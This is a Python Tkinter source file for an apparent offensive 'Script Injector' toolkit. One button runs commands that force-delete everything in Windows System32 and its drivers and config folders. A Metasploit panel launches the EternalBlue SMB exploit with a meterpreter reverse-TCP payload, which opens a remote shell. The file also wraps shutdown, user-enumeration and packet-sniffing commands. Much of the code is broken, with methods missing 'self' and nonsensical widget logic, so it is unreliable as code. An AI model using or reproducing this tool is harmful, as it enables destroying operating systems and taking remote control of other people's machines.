import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import os
import socket
import subprocess 
import platform
from tkinter import scrolledtext
try:
    from plyer import notification
except ImportError:
    notification = None
import pyshark
import scapy.all as scapy 
import threading   
from pymetasploit3.msfrpc import MsfRpcClient 
import tkwinterm
import openvpn_api


root = tk.Tk()
root.title("Scripts injection")
root.geometry("1900x1020")
root.config(bg="#f0f0f0")


# now we are going to put everything else inside the class 

class welcome_screen:
    def __init__(self, master):
        self.master = master
        self.master.title("Welcome to the Script Injector")
        self.master.geometry("1900x1020")
        self.master.config(bg="#f0f0f0")
        
        self.label = tk.Label(self.master, text="Welcome to the Script Injector", font=("Arial", 24, "bold"), bg="#f0f0f0")
        self.label.pack(pady=50)
        
        self.vpn_button = tk.Button(self.master, text="Connect to VPN", command=self.vpn_connect, font=("Arial", 14), bg="#2196F3", fg="white", padx=20, pady=10)
        self.vpn_button.pack(pady=20)
        
        self.start_button = tk.Button(self.master, text="Start", command=self.start_injector, font=("Arial", 14), bg="#4CAF50", fg="white", padx=20, pady=10)
        self.start_button.pack(pady=20)
    
    def start_injector(self):
        self.master.destroy()  # Close the welcome screen
        root = tk.Tk()
        app = ScriptInjector(root)  # Open the main injector window
        root.mainloop()
    
    def start_vpn(self):
        subprocess.run(["protonvpn-cli", "c", "-f"])
        
    def stop_vpn(self):
        subprocess.run(["protonvpn-cli", "d"])
    
    def vpn_connect(self):
        btn = tk.Button(self.master, text="Connecting to VPN...", command=self.start_vpn, font=("Arial", 14), bg="#2196F3", fg="white", padx=20, pady=10)
        btn.pack(pady=20)
        
        btn2 = tk.Button(self.master, text="Disconnect VPN", command=self.stop_vpn, font=("Arial", 14), bg="#f44336", fg="white", padx=20, pady=10)
        btn2.pack(pady=20)
        
    
class ScriptInjector:
    def __init__(self, master):
        self.master = master
        
      
        self.main_frame = tk.Frame(self.master, bg="#f0f0f0", width=1900, height=1020)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        self.ubuntu_frame = tk.Frame(self.main_frame, bg="#f0f0f0")
        self.ubuntu_frame.pack(fill=tk.BOTH, expand=True)
        
        self.tab = ttk.Notebook(self.main_frame)
        self.tab.pack(fill=tk.BOTH, expand=True)
        
        self.btcore = tk.Button(self.ubuntu_frame, text="Inject Script", command=self.inject_script)
        self.btcore.pack(pady=20)
        
        self.btcore2 = tk.Button(self.ubuntu_frame, text="Go to Linux Dashboard", command=self.go_to_next)
        self.btcore2.pack(pady=20)
        
        self.btcore3 = tk.Button(self.ubuntu_frame, text="Destroy System Files", command=self.destroy_system_files)
        self.btcore3.pack(pady=20)
        
     # now we want to inject scripts into the system
            
    def destroy_system_files():
       if platform.system() == "Windows":
         try:
            subprocess.run("del /F /Q C:\\Windows\\System32\\*", shell=True)
            subprocess.run("del /F /Q C:\\Windows\\System32\\drivers\\*", shell=True)
            subprocess.run("del /F /Q C:\\Windows\\System32\\config\\*", shell=True)
            subprocess.run("del /F /Q C:\\Windows\\System32\\LogFiles\\*", shell=True)
            subprocess.run("del /F /Q C:\\Windows\\System32\\spool\\*", shell=True)
            subprocess.run("del /F /Q C:\\Windows\\System32\\wbem\\*", shell=True)
            messagebox.showinfo("Success", "System files destroyed successfully!")
         except Exception as e:
            messagebox.showerror("Error", f"Failed to destroy system files: {str(e)}")
       else: 
         messagebox.showwarning("Unsupported OS", "This function is only supported on Windows.")
    
    def go_to_next(self):
        # Hide current frame and load the next one
        self.main_frame.pack_forget()
        LinuxDashboard(self.master)  # Load Linux dashboard in the same window

    def inject_script(self):
        script_path = filedialog.askopenfilename(title="Select Script", filetypes=[("Python Files", "*.py")])
        if script_path:
            try:
                if platform.system() == "Windows":
                    subprocess.Popen(["python", script_path], shell=True)
                else:
                    subprocess.Popen(["python3", script_path])
                messagebox.showinfo("Success", f"Script '{os.path.basename(script_path)}' injected successfully!")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to inject script: {str(e)}")
            else:
              messagebox.showwarning("No File Selected", "Please select a script to inject.")
        
        
    def automatic_injection():
        getme = tk.Entry(root, width=30)
        getme.place(x=50, y=150)    
        if getme.get() == "ipconfig" or getme.get() == "ifconfig":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("ipconfig/all", shell=True)
        elif getme.get() == "netstat":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netstat -an", shell=True)
        elif getme.get() == "ping":
          who = tk.Entry(root, width=30)
          who.place(x=50, y=180)
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run(f"ping {who.get()}", shell=True)
        elif getme.get() == "tracert" or getme.get() == "traceroute":
          who = tk.Entry(root, width=30)
          who.place(x=50, y=180)
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run(f"{getme.get()} {who.get()}", shell=True)
        elif getme.get() == "nslookup":
          who = tk.Entry(root, width=30)
          who.place(x=50, y=180)
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run(f"nslookup {who.get()}", shell=True)
        elif getme.get() == "arp":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("arp -a", shell=True)
        elif getme.get() == "route":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("route print", shell=True)
        elif getme.get() == "netsh":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netsh interface show interface", shell=True)
        elif getme.get() == "net":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("net view", shell=True)
        elif getme.get() == "systeminfo":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("systeminfo", shell=True)
        elif getme.get() == "tasklist":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("tasklist", shell=True)
        elif getme.get() == "whoami":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("whoami", shell=True)
        elif getme.get() == "hostname":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("hostname", shell=True)
        elif getme.get() == "net user":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("net user", shell=True)
        elif getme.get() == "net localgroup":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("net localgroup", shell=True)
        elif getme.get() == "net group":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("net group", shell=True)
        elif getme.get() == "net share":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("net share", shell=True)
        elif getme.get() == "netstat -ano":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netstat -ano", shell=True)
        elif getme.get() == "netstat -b":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netstat -b", shell=True)
        elif getme.get() == "netstat -s":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netstat -s", shell=True)
        elif getme.get() == "netstat -r":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netstat -r", shell=True)
        elif getme.get() == "netstat -e":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netstat -e", shell=True)
    # now let's get fire wall status
        elif getme.get() == "netsh advfirewall show allprofiles":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netsh advfirewall show allprofiles", shell=True)
        elif getme.get() == "netsh advfirewall show currentprofile":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netsh advfirewall show currentprofile", shell=True)
        elif getme.get() == "netsh advfirewall show domainprofile":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netsh advfirewall show domainprofile", shell=True)
        elif getme.get() == "netsh advfirewall show privateprofile":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netsh advfirewall show privateprofile", shell=True)
        elif getme.get() == "netsh advfirewall show publicprofile":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netsh advfirewall show publicprofile", shell=True)
        elif getme.get() == "netsh advfirewall show state":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netsh advfirewall show state", shell=True)
        elif getme.get() == "netsh advfirewall show settings":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netsh advfirewall show settings", shell=True)
        elif getme.get() == "netsh advfirewall show rule name=all":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netsh advfirewall show rule name=all", shell=True)
        elif getme.get() == "netsh advfirewall show rule name=all dir=in":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("netsh advfirewall show rule name=all dir=in", shell=True)
    # now let's restart the computer, run update, shutdown, log off, lock, sleep, hibernate
        elif getme.get() == "shutdown -r":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("shutdown -r", shell=True)
        elif getme.get() == "shutdown -s":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("shutdown -s", shell=True)
        elif getme.get() == "shutdown -l":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("shutdown -l", shell=True)
        elif getme.get() == "shutdown -h":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("shutdown -h", shell=True)
        elif getme.get() == "shutdown -t":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("shutdown -t", shell=True)
    # now let's get system information
        elif getme.get() == "systeminfo":
          subprocess.Popen(getme.get(), shell=True)
          subprocess.run("systeminfo", shell=True)
        else:
           messagebox.showwarning("Invalid Command", "Please enter a valid command to execute.")

class LinuxDashboard:
    def __init__(self, master):
        self.master = master
        self.master.title("Linux Command Injector")
        self.master.geometry("1200x800")
        self.master.config(bg="#1e1e1e")

        # --- Top Header & Inputs ---
        input_frame = tk.Frame(master, bg="#2d2d2d", pady=10)
        input_frame.pack(fill=tk.X)

        tk.Label(input_frame, text="TARGET (IP/URL/FILE):", fg="white", bg="#2d2d2d", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=20)
        self.target_entry = tk.Entry(input_frame, width=40, font=("Consolas", 12), bg="#3d3d3d", fg="white", insertbackground="white")
        self.target_entry.pack(side=tk.LEFT, padx=10)
        self.target_entry.insert(0, "127.0.0.1")

        # --- Main Layout ---
        self.main_container = tk.Frame(master, bg="#1e1e1e")
        self.main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Left Side: Button Menu (Scrollable)
        self.menu_canvas = tk.Canvas(self.main_container, bg="#252526", width=250, highlightthickness=0)
        self.scrollbar = tk.Scrollbar(self.main_container, orient="vertical", command=self.menu_canvas.yview)
        self.button_frame = tk.Frame(self.menu_canvas, bg="#252526")

        self.menu_canvas.create_window((0, 0), window=self.button_frame, anchor="nw")
        self.menu_canvas.configure(yscrollcommand=self.scrollbar.set)

        self.menu_canvas.pack(side=tk.LEFT, fill=tk.Y)
        self.scrollbar.pack(side=tk.LEFT, fill=tk.Y)

        # Right Side: Terminal Output
        self.terminal = scrolledtext.ScrolledText(self.main_container, bg="black", fg="#00ff00", font=("Consolas", 11), insertbackground="white")
        self.terminal.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(10, 0))

        self.create_buttons()
        
        self.back_btn = tk.Button(master, text="<< Back", command=self.go_back, bg="#3e3e42", fg="white", relief=tk.FLAT)
        self.back_btn.place(x=10, y=10)
        
        self.next_btn = tk.Button(master, text="Next >>", command=self.next, bg="#3e3e42", fg="white", relief=tk.FLAT)
        self.next_btn.place(x=1100, y=10)
        
     
    def go_back(self):
        self.main_container.pack_forget()
        ScriptInjector(self.master)  # Load the previous dashboard in the same window
     
    def next(self):
        self.main_container.pack_forget()
        MsfInjector(self.master)  # Load the next dashboard in the same window
     
    def create_buttons(self):
        # Category: System Commands
        self.add_section("SYSTEM")
        system_cmds = [
            ("List Files (ls)", "ls -la"), ("Disk Space (df)", "df -h"), 
            ("Memory (free)", "free -h"), ("Usage (du)", "du -sh"),
            ("System Info", "uname -a")
        ]
        for name, cmd in system_cmds: self.make_btn(name, cmd)

        # Category: Network
        self.add_section("NETWORK")
        net_cmds = [
            ("IP Config", "ifconfig"), ("Netstat (All)", "netstat -an"),
            ("TCP/UDP Ports", "netstat -tuln"), ("Arp Table", "arp -a"),
            ("Route Table", "route -n"), ("Ping", "ping -c 4"),
            ("Traceroute", "traceroute"), ("DNS Lookup", "nslookup"),
            ("Nmap Scan", "nmap")
        ]
        for name, cmd in net_cmds: self.make_btn(name, cmd)

        # Category: Systemctl
        self.add_section("SYSTEMCTL")
        sys_cmds = [
            ("Status", "systemctl status"), ("List Units", "systemctl list-units"),
            ("Is Active?", "systemctl is-active"), ("List Dependencies", "systemctl list-dependencies")
        ]
        for name, cmd in sys_cmds: self.make_btn(name, cmd)

        # Category: Dangerous
        self.add_section("DANGER ZONE")
        self.make_btn("RM -RF (SIMULATED)", "echo 'rm -rf blocked for safety'", color="#ff4444")

        self.button_frame.update_idletasks()
        self.menu_canvas.config(scrollregion=self.menu_canvas.bbox("all"))

    def add_section(self, text):
        lbl = tk.Label(self.button_frame, text=text, bg="#333333", fg="#aaaaaa", font=("Arial", 8, "bold"), pady=5)
        lbl.pack(fill=tk.X, pady=(10, 0))

    def make_btn(self, name, cmd, color="#3e3e42"):
        btn = tk.Button(self.button_frame, text=name, bg=color, fg="white", relief=tk.FLAT, 
                        command=lambda: self.run_thread(cmd), pady=5)
        btn.pack(fill=tk.X, padx=5, pady=2)
        btn.bind("<Enter>", lambda e: btn.config(bg="#505050"))
        btn.bind("<Leave>", lambda e: btn.config(bg=color))

    def run_thread(self, cmd):
        threading.Thread(target=self.execute, args=(cmd,), daemon=True).start()

    def execute(self, cmd):
        target = self.target_entry.get().strip()
        
        # Logic to append target if the command requires it
        if cmd in ["ping -c 4", "traceroute", "nslookup", "nmap", "git clone", "du -sh"]:
            full_cmd = f"{cmd} {target}"
        else:
            full_cmd = cmd

        self.terminal.insert(tk.END, f"\n[Executing]: {full_cmd}\n" + "-"*40 + "\n")
        
        try:
            process = subprocess.Popen(full_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in process.stdout:
                self.terminal.insert(tk.END, line)
                self.terminal.see(tk.END)
            process.wait()
        except Exception as e:
            self.terminal.insert(tk.END, f"Error: {e}\n")
# now let's destroy windows system files and folders

        

            
# now we are going to create a class for scapy and pyshark to capture packets and analyze them
class PacketAnalyzer:
    def __init__(self, master):
        self.master = master
        self.master.title("Packet Analyzer")
        self.master.geometry("1900x1020")
        self.master.config(bg="#f0f0f0")
        
        
        self.display = scrolledtext.ScrolledText(root, bg="#f0f0f0", width=70, height=20)
        self.display.pack(padx=10, pady=10)

        # 2. Start Button
        self.btn = tk.Button(root, text="Start Live Sniff", command=self.start_sniffing)
        self.btn.pack(pady=5)
        self.btn.config(state='normal')
        
        self.btn2 = tk.Button(root, text="Capture Packets", command=self.capture_packets)
        self.btn2.pack(pady=5)
        
        self.btn3 = tk.Button(root, text="Analyze Packets", command=self.scan)
        self.btn3.pack(pady=5)

        self.scan_frame = tk.Frame(root, bg="#f0f0f0")
        self.scan_frame.pack(pady=10)
        tk.Label(self.scan_frame, text="ARP Scan Target:", bg="#f0f0f0").pack(side=tk.LEFT, padx=(0,5))
        self.scan_entry = tk.Entry(self.scan_frame, width=30)
        self.scan_entry.pack(side=tk.LEFT, padx=(0,5))
        self.scan_btn = tk.Button(self.scan_frame, text="Start ARP Scan", command=self.start_scan)
        self.scan_btn.pack(side=tk.LEFT)


     # now we want to capture packets using scapy and pyshark
    def capture_packets():
        capture = pyshark.LiveCapture(interface='eth0')
        for packet in capture.sniff_continuously(packet_count=10):
            messagebox.showinfo("Captured Packet", str(packet)  == "TCP" and packet.tcp.flags == "0x02" and "SYN" in packet.tcp.flags)
            
    

# 1. Initialize capture on your interface (e.g., 'WiFi', 'eth0', or 'en0')
        capture = pyshark.LiveCapture(interface='WiFi')

# 2. Apply a filter just like the Wireshark search bar
        capture.display_filter = 'dns'
        messagebox.showinfo("Packet Capture", '--- Listening for live DNS traffic ---')

# 3. Process packets continuously as they arrive
        for packet in capture.sniff_continuously(packet_count=5):
          try:
            timestamp = packet.sniff_time  # Accessing data fields mimics the Wireshark UI tree structu
            src_ip    = packet.ip.src
            dst_ip    = packet.ip.dst
            messagebox.showinfo("Captured Packet", f"[{timestamp}] {src_ip} -> {dst_ip}")
            if 'DNS' in packet: # Check for specific layers and print nested data
               messagebox.showinfo("DNS Query", f" 🔍 Query: {packet.dns.qry_name}")

          except AttributeError:
              messagebox.showwarning("Attribute Error", "Failed to access packet attributes.")# Handle packets missing expected layers (e.g. non-IP traffic)
# now we are going to have more packet analysis inside the app we are using and the more it get's seroius the more we can use it very fast 
       
    def update_display(self, packet_info):
        """Adds text to the widget and auto-scrolls to the bottom."""
        self.display.insert(tk.END, packet_info + "\n")
        self.display.see(tk.END)

    def sniff_logic(self):
        """The background task that talks to PyShark."""
        # Change 'WiFi' to your actual interface name (e.g., 'eth0' or 'en0')
        capture = pyshark.LiveCapture(interface='WiFi')
        
        try:
            for packet in capture.sniff_continuously():
                # Extract simple summary like Wireshark's top bar
                info = f"[{packet.number}] {packet.highest_layer}: {packet.ip.src} -> {packet.ip.dst}"
                
                # Use .after() to safely send data from thread to Tkinter
                self.root.after(0, self.update_display, info)
        except Exception as e:
            self.root.after(0, self.update_display, f"Capture Error: {e}")

    def start_sniffing(self):
        """Starts the background thread so the GUI doesn't freeze."""
        self.btn.config(state='disabled', text="Capturing...")
        thread = threading.Thread(target=self.sniff_logic, daemon=True)
        messagebox.showinfo("Packet Sniffer", "Started live packet capture. Check the display for updates.")
        thread.start()
    
    def scan(ip_range, display_widget, button):
      try:
        # Create ARP Request
        arp_req = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast/arp_req
        
        # Send packet and get answered results
        answered = scapy.srp(packet, timeout=2, verbose=False)[0]

        # Use .after to update the UI safely from the thread
        def update_ui():
            display_widget.delete(1.0, tk.END)
            display_widget.insert(tk.END, f"{'IP Address':<20} {'MAC Address'}\n")
            display_widget.insert(tk.END, "-"*40 + "\n")
            for _, received in answered:
                display_widget.insert(tk.END, f"{received.psrc:<20} {received.hwsrc}\n")
            button.config(state=tk.NORMAL)

        root.after(0, update_ui)
      except Exception as e:
         root.after(0, lambda: display_widget.insert(tk.END, f"\nError: {e}"))
         root.after(0, lambda: button.config(state=tk.NORMAL))
    
    def start_scan():
        target = tk.Entry(root, width=30)
        target = target.get()
        target.delete(1.0, tk.END)
        target.insert(tk.END, f"Scanning {target}... please wait.\n")
        
       
       
class MsfInjector:
    def __init__(self, master):
        self.master = master
        self.master.title("Metasploit Injector")
        self.master.geometry("1900x1020")
        self.master.config(bg="#f0f0f0")  
        
        
        seft = tk.Label(root, text="Metasploit Module Injector", font=("Arial", 16, "bold"), bg="#f0f0f0")
        seft.pack(pady=20)
        
        self.frame_O2 = tk.Frame(root, bg="purple", width=800, height=400)
        self.frame_O2.pack(pady=10)
        
        self.btn = tk.Button(root, text="Inject Metasploit Module", command=self.inject_metasploit)
        self.btn.pack(pady=20)
        
        self.btn2 = tk.Button(root, text="Run Vulnerability Scan", command=self.vulnerability_scan)
        self.btn2.pack(pady=20)
        
        self.btn3 = tk.Button(root, text="Execute Payload", command=self.execute_payload)
        self.btn3.pack(pady=20)  
        
        self .btn4 = tk.Button(root, text="Open Terminal", command=self.open_terminal)
        self.btn4.pack(pady=20)
    ''' now we want to inject metasploit modules into the system and execute them '''
    
    
    def inject_metasploit(self):
        try:
            client = MsfRpcClient('your_password', port=55553)
            messagebox.showinfo("MSF Connection", "Connected to Metasploit RPC Server!")
            
            # Example: List available exploits
            exploits = client.modules.exploits
            messagebox.showinfo("Available Exploits", f"Found {len(exploits)} exploits in Metasploit!")
            
            # Example: Use an exploit module
            exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
            exploit['RHOSTS'] = 'target_ip'
            exploit['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
            exploit['LHOST'] = 'your_ip'
            exploit['LPORT'] = 4444
            
            # Execute the exploit
            result = exploit.execute()
            messagebox.showinfo("Exploit Result", f"Exploit executed with result: {result}")
        except Exception as e:
            messagebox.showerror("MSF Error", f"Failed to connect or execute: {e}")
            
    
    def vulnerability_scan(self):
        try:
            client = MsfRpcClient('your_password', port=55553)
            messagebox.showinfo("MSF Connection", "Connected to Metasploit RPC Server!")
            
            # Example: Run a vulnerability scan
            scanner = client.modules.use('auxiliary', 'scanner/smb/smb_version')
            scanner['RHOSTS'] = 'target_ip'
            result = scanner.execute()
            messagebox.showinfo("Scan Result", f"Vulnerability scan executed with result: {result}")
        except Exception as e:
            messagebox.showerror("MSF Error", f"Failed to connect or execute: {e}"
                                )
    
    def execute_payload(self):
        try:
            client = MsfRpcClient('your_password', port=55553)
            messagebox.showinfo("MSF Connection", "Connected to Metasploit RPC Server!")
            
            # Example: Execute a payload
            payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
            payload['LHOST'] = 'your_ip'
            payload['LPORT'] = 4444
            
            result = payload.execute()
            messagebox.showinfo("Payload Result", f"Payload executed with result: {result}")
        except Exception as e:
            messagebox.showerror("MSF Error", f"Failed to connect or execute: {e}")
            
    # now let's tkwinterm to create a terminal inside the app in this class 
    def open_terminal(self):
        term_window = tk.Toplevel(self.master)
        term_window.title("Terminal")
        term_window.geometry("1400x900")
        terminal = tkwinterm.Terminal(term_window)
        terminal.pack(fill=tk.BOTH, expand=True)
        
        
# ___________________________________________________________________________________________________________________________________________________________________________________________________________________________________
#____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________


if __name__ == "__main__":
     app = welcome_screen(root)
     app = ScriptInjector(root)
     linux_app = LinuxDashboard(root)
     packet_analyzer = PacketAnalyzer(root)
     msf_injector = MsfInjector(root)
     root.mainloop()
